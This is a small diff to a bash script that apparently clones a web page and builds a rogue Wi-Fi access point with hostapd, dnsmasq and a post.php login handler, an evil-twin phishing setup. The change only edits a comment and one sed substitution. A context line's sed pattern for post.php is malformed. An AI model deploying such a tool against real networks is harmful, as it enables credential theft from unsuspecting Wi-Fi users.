@@ -62,7 +62,7 @@ sleep 1
 echo -e ${yellow}"$URL Cloned Successfully"${clear}
 sleep 2
 
-#Copying Resources
+#Copying Resources To Local Directory
 
 cp Resources/hosts . 2>/dev/null
 cp Resources/dnsmasq.conf . 2>/dev/null
@@ -74,7 +74,7 @@ cp Resources/post.php . 2>/dev/null
 #Replacing Variables In Files
 sed -i "s/domain/${domain}g/" post.php
 sed -i "s/domain/${domain}/g" index.html
-sed -i "s/10.1.1.1/${domain}/g" dnsmasq.conf
+sed -i "s/domain/${domain}/g" dnsmasq.conf
 sed -i "s/AP/${AP}/g" hostapd.conf
 sed -i "s/SSID/${SSID}/g" hostapd.conf
 sed -i "s/domain/${domain}/g" authenticate.html
